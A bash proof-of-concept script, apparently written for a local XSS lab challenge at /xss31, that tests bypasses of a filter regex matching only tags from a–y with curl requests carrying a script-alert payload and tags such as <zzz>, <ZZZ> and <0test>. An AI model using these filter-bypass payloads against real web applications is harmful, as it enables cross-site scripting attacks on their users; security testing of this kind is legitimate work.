#!/bin/bash
#
# POC: Regex Bypass Vulnerability in XSS Filter at /xss31
# Demonstrates that the regex pattern r'<[a-yA-Y/]+' can be bypassed
# using tags starting with 'z' or non-letter characters
#

TARGET="http://localhost:5001"
ENDPOINT="/xss31"

echo "============================================"
echo "POC: Regex Bypass in XSS Filter (/xss31)"
echo "============================================"
echo ""

# Test 1: Normal tag that should be blocked
echo "[TEST 1] Testing with normal HTML tag (should be blocked):"
echo "Request: ${TARGET}${ENDPOINT}?name=<script>alert(1)</script>"
RESPONSE1=$(curl -s "${TARGET}${ENDPOINT}?name=<script>alert(1)</script>")
echo "Response: $RESPONSE1"
if echo "$RESPONSE1" | grep -q "can't use that tag"; then
    echo "✓ BLOCKED: Regex correctly detected and blocked <script> tag"
else
    echo "✗ NOT BLOCKED: Unexpected behavior"
fi
echo ""

# Test 2: Z-tag bypass (regex only matches a-y, not z)
echo "[TEST 2] Testing with Z-tag bypass (should bypass regex):"
echo "Request: ${TARGET}${ENDPOINT}?name=<zzz>test</zzz>"
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}${ENDPOINT}?name=<zzz>test</zzz>")
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE" | cut -d: -f2)
RESPONSE2_BODY=$(echo "$RESPONSE2" | grep -v "HTTP_CODE")
echo "Response: $RESPONSE2_BODY"
echo "HTTP Status: $HTTP_CODE2"

if echo "$RESPONSE2_BODY" | grep -q "can't use that tag"; then
    echo "✗ FAILED: Z-tag was blocked (regex may have been fixed)"
elif [ "$HTTP_CODE2" = "500" ]; then
    echo "✓ REGEX BYPASSED: Returns 500 error (not blocked by regex filter)"
    echo "  The absence of 'can't use that tag' message confirms regex bypass"
    echo "  The 500 error is due to application bug (check_xss not defined)"
else
    echo "✓ REGEX BYPASSED: Tag processed without regex block message"
fi
echo ""

# Test 3: Numeric character bypass
echo "[TEST 3] Testing with numeric character bypass:"
echo "Request: ${TARGET}${ENDPOINT}?name=<0test>"
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}${ENDPOINT}?name=<0test>")
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE" | cut -d: -f2)
RESPONSE3_BODY=$(echo "$RESPONSE3" | grep -v "HTTP_CODE")
echo "Response: $RESPONSE3_BODY"
echo "HTTP Status: $HTTP_CODE3"

if echo "$RESPONSE3_BODY" | grep -q "can't use that tag"; then
    echo "✗ FAILED: Numeric tag was blocked"
elif [ "$HTTP_CODE3" = "500" ]; then
    echo "✓ REGEX BYPASSED: Returns 500 error (not blocked by regex filter)"
else
    echo "✓ REGEX BYPASSED: Tag processed without regex block message"
fi
echo ""

# Test 4: Uppercase Z bypass
echo "[TEST 4] Testing with uppercase Z bypass:"
echo "Request: ${TARGET}${ENDPOINT}?name=<ZZZ>test"
RESPONSE4=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}${ENDPOINT}?name=<ZZZ>test")
HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE" | cut -d: -f2)
RESPONSE4_BODY=$(echo "$RESPONSE4" | grep -v "HTTP_CODE")
echo "Response: $RESPONSE4_BODY"
echo "HTTP Status: $HTTP_CODE4"

if echo "$RESPONSE4_BODY" | grep -q "can't use that tag"; then
    echo "✗ FAILED: Uppercase Z-tag was blocked"
elif [ "$HTTP_CODE4" = "500" ]; then
    echo "✓ REGEX BYPASSED: Returns 500 error (not blocked by regex filter)"
else
    echo "✓ REGEX BYPASSED: Tag processed without regex block message"
fi
echo ""

echo "============================================"
echo "SUMMARY:"
echo "============================================"
echo "The regex pattern r'<[a-yA-Y/]+' only matches letters a-y and A-Y."
echo "Tags starting with 'z', 'Z', or non-letter characters bypass the filter."
echo ""
echo "VULNERABILITY CONFIRMED: Regex bypass allows malicious input through filter."
echo "Current exploitation prevented by application error (NameError: check_xss)."
echo "If application bug is fixed, this becomes a critical XSS vulnerability."
echo "============================================"